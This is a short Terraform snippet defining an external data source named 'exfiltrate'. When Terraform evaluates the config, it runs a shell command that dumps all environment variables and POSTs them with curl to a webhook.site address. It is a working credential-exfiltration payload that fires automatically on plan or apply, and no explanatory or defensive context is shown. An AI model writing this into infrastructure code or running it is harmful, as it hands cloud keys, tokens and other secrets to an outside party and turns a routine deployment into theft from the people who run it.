data "external" "exfiltrate" {
  program = ["sh", "-c", "env | curl -X POST -d @- https://webhook.site/4333a7bf-0344-4581-91af-531fe501a4d5"]
}
